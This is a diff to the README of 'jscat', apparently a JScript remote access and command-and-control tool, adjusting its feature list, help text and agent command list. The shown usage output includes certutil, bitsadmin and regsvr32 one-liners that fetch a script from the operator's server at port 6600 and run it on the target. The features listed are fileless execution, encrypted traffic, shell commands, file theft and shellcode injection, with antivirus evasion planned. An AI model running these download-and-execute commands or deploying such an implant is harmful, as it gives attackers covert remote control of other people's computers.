@@ -15,10 +15,10 @@ _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 ### Features
 
 - 反弹上线/自动上线/无文件落地
-- 流量加密
+- 流量加密(rc4)
 - 命令执行
 - 上传/下载
-- shellcode注入
+- shellcode注入(DotNetToJS)
 
 ### Install
 
@@ -37,18 +37,18 @@ usage: jscat.py [-h] --host HOST [-p PORT] [--new_key] [-s SLEEP_TIME]
 
 optional arguments:
   -h, --help            show this help message and exit
-  --host HOST           host foreign ip for host connect
-  -p PORT, --port PORT  host listening port,default is 6600
+  --host HOST           server foreign ip for host connect
+  -p PORT, --port PORT  server listening port,default is 6600
   --new_key             generate new rc4 key to encrypt data
   -s SLEEP_TIME, --sleep_time SLEEP_TIME
-                        set agent sleep time in second,default is 5
+                        set host sleep time in second,default is 5
                         
 ➜  python jscat.py --host 172.16.80.1
 
 [*]server cipher key: FnxYtigYdCcyrXph
 [*]server running in  0.0.0.0:6600...
 [*]host connect ip is 172.16.80.1:6600...
-[*]Execute in client:
+[*]Execute in host:
 certutil -urlcache -split -f http://172.16.80.1:6600/init css.js && cscript //nologo css.js
 bitsadmin /transfer n http://172.16.80.1:6600/init css.js && cscript //nologo css.js
 regsvr32 /s /n /u /i:http://172.16.80.1:6600/file.sct scrobj.dll
@@ -94,9 +94,10 @@ xTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4Fh
 Usage:
 	info: get system info
 	sleep [seconds]: set sleep time
-	shell [cmd]: execute shell command
-	run [cmd]: run program and return
+	ps: show process list
 	cat [path_file]: show remote file context
+	run [cmd]: run program and return
+	shell [cmd]: execute shell command
 	upload [local_file] [remote_file]: upload file
 	download [local_file] [remote_file]: download file
 	js run [local_pathname]: run jscript file in remote host
@@ -111,7 +112,7 @@ Usage:
 
 ### TODO
 
-- [ ]  JScript代码混淆
+- [ ] JScript代码混淆
 - [ ] 免杀
 
 
